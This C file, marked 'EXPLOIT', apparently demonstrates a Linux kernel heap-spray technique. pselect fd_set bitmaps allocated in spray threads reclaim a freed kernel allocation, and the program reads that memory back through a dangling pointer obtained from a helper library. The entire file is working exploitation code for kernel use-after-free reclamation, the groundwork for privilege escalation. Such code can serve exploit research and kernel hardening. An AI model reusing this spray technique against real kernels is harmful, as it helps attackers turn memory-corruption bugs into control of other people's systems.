#include <pthread.h>
#include <stdbool.h>
#include <stddef.h>

#include "libs/io_uring.h"
#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

#define TARGET_NFDS_CEIL(x) (((x + 5) / 6) / 8)
#define TARGET_NFDS_FLOOR(x) ((x / 6) / 8 * 64)
#define TARGET_NFDS(x) TARGET_NFDS_FLOOR(x)
#define SPRAY_COUNT 0x1

u64 target_nfds;
int alloc, ready;
int block_pipe[2];

void *spray_thread(void *arg) {
  pin_cpu(0, 0);
  long id = (long)arg;

  // Allocate the bitmaps
  // We need 3 sets: readfds, writefds, exceptfds.
  // Size of one set in bytes:
  size_t set_size = (target_nfds + 7) / 8;

  fd_set *read_set = malloc(set_size);
  fd_set *write_set = malloc(set_size);
  fd_set *except_set = malloc(set_size);

  if (!read_set || !write_set || !except_set) {
    perror("malloc");
    return NULL;
  }

  // CRITICAL: We must ensure pselect actually blocks.
  // It blocks if it monitors a valid FD that is NOT ready.
  // We clear our "A"s at the bit corresponding to our pipe
  // and set the bit properly so the kernel logic works.
  FD_ZERO(read_set);
  FD_ZERO(write_set);
  FD_ZERO(except_set);
  FD_SET(block_pipe[0], read_set);

  struct timespec ts;
  ts.tv_sec = 1000;
  ts.tv_nsec = 0;

  event_signal(ready);
  event_wait(alloc);

  int ret =
      SYSCHK(pselect(target_nfds, read_set, write_set, except_set, &ts, NULL));

  ldebug("spray thread %ld pselect returned %d", id, ret);

  free(read_set);
  free(write_set);
  free(except_set);
  return NULL;
}

int main(int argc, char *argv[]) {
  pthread_t spray_t[SPRAY_COUNT];
  u64 size = argc < 2 ? 0x800 : strtol(argv[1], 0, 0);
  target_nfds = TARGET_NFDS(size);
  char *buf[size];
  bzero(buf, size);
  int *dummy_fds[target_nfds];
  bzero(dummy_fds, sizeof(dummy_fds));

  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  setbuf(stdin, NULL);

  ldebug("using size 0x%lx", size);
  ldebug("target_nfds = %lu", target_nfds);

  lstage("INIT");

  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);

  alloc = event_create();
  ready = event_create();

  SYSCHK(pipe(block_pipe));
  linfo("pipefds = {0x%x, 0x%x}", block_pipe[0], block_pipe[1]);
  linfo("Opening dummy fds up to %ld", target_nfds);
  for (int i = block_pipe[1]; i < target_nfds; i++)
    SYSCHK(open("/dev/null", O_RDONLY));

  init();

  lstage("START");

  linfo("starting spray threads");
  for (long i = 0; i < SPRAY_COUNT; i++) {
    SYSCHK(pthread_create(&spray_t[i], NULL, spray_thread, (void *)i));
    event_wait(ready);
  }

  linfo("allocate");
  void *ptr = keap_malloc(size, GFP_KERNEL);
  keap_write(ptr, buf, size);
  keap_free(ptr);

  ldebug("dangling ptr: %p", ptr);

  linfo("realloc");
  for (int i = 0; i < SPRAY_COUNT; i++)
    event_signal(alloc);

  usleep(100000);

  keap_read(ptr, buf, size);
#ifdef DEBUG
  print_hex(buf, size);
#endif

  // free again
  CHK(write(block_pipe[1], "X", 1) == 1);

  CHK(memcmp(buf, "\x20", 1) == 0);

  for (int i = 0; i < SPRAY_COUNT; i++)
    pthread_join(spray_t[i], NULL);

  lstage("END");

  return 0;
}
